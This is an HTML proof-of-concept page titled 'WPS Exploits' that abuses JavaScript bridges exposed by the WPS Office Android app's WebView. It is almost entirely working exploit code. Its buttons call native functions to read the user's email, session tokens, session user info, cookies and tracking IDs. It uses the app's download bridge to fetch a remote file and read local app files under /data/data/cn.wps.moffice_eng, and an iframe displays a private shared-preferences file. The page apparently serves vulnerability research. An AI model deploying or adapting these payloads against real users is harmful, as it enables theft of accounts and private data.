<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
        integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <title>WPS Exploits</title>
</head>

<body>
    <h1>WPS Exploits!</h1>
    <script type="text/javascript">
        var string = "";

        function findAllVariables() {
            for (let variable in window) {
                if (window.hasOwnProperty(variable)) {

                    var ul = document.getElementById("list");
                    var li = document.createElement("li");
                    li.className = "list-group-item"
                    li.appendChild(document.createTextNode(variable));
                    ul.appendChild(li);
                }
            }
            // = string;
        }

        function getMethodsNames(obj) {
            return Object.keys(obj)
                .filter((key) => typeof obj[key] === 'function');
        }

        // Get the Object's methods (functions):
        function getMethods(obj) {
            return Object.keys(obj)
                .filter((key) => typeof obj[key] === 'function')
                .map((key) => obj[key]);
        }


        function getObj(obj) {
            try {
                document.getElementById("myP").innerHTML = getMethodsNames(obj);
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function call() {
            try {
                document.getElementById("myP").innerHTML = splash.JSGetClientInfo();
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function showToastJS() {
            try {
                //qing.JSShowToast("test 1");
                //splash.JSShowToast("test 2");
                WpsJSOverseaBridge.JSShowToast("Hey I just showed a custom toast that is coded in Java in your app!! RCE is fun");
                //string.JSShowToast("test 4");
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }


        function getUserMail() {
            try {
                document.getElementById("myP").innerHTML = splash.jsGetUserMail();
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function getCookies() {
            try {
                document.getElementById("myP").innerHTML = document.cookie;
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function requestSess() {
            try {
                document.getElementById("myP").innerHTML = splash.requestSession();
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function requestSessUserInfo() {
            try {
                document.getElementById("myP").innerHTML = splash.requestSessionUserInfo();
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function trackingInfo() {
            try {
                document.getElementById("myP").innerHTML = splash.trackingInfo("wps_sid");
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function tryDownload() {
            try {
                document.getElementById("myP").innerHTML = splash.JSDownload("random", "https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/testFINDME.txt")
                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function tryDownload2() {
            try {
                document.getElementById("myP").innerHTML = splash.JSDownload("random", "https://account.wps.com/api/v3/mine#.txt")
                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function tryDownload3() {
            try {
                document.getElementById("myP").innerHTML = splash.JSDownload("random", "file:///data/data/cn.wps.moffice_eng/shared_prefs/fileradar_record.xml")
                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function testGetFile() {
            try {
                document.getElementById("myP").innerHTML = getFileSize("file:///data/data/cn.wps.moffice_eng/shared_prefs/fileradar_record.xml")
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }
    </script>

    <button onclick="findAllVariables()">
        List all values in the DOM
    </button>
    <br>
    <button onclick="getCookies()">
        Show Cookies
    </button>
    <br>
    <button onclick="getObj(qing)">
        Get Qing
    </button>

    <button onclick="getObj(splash)">
        Get Splah
    </button>

    <button onclick="getObj(WpsJSOverseaBridge)">
        Get Wps
    </button>
    <br>
    <button onclick="call()">
        Call JSGetClientInfo() - Native Function
    </button>
    <br>
    <button onclick="showToastJS()">
        Call showToast() - Native Function
    </button>
    <br>
    <button onclick="getUserMail()">
        Call Get User Mail - Native Function
    </button>

    <br>
    <button onclick="requestSess()">
        Call requestSess - Native Function
    </button>

    <br>
    <button onclick="requestSessUserInfo()">
        Call requestSessUserInfo - Native Function
    </button>

    <br>
    <button onclick="trackingInfo()">
        Call trackingInfo - Native Function
    </button>

    <br>
    <button onclick="tryDownload()">
        Call download - Native Function

    </button>
    <br>
    <button onclick="tryDownload2()">
        Call download2 - Native Function

    </button>
    <br>
    <button onclick="tryDownload3()">
        Call download3 - Native Function

    </button>

    <br>
    <button onclick="testGetFile()">
        Call File - Native Function

    </button>




    <p id="myP">

    </p>
    <ul class="list-group" id="list">
    </ul>

    <iframe src="file:///data/data/cn.wps.moffice_eng/shared_prefs/public_default.xml" width=200 height=300></iframe>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
        crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
        crossorigin="anonymous"></script>
</body>

</html>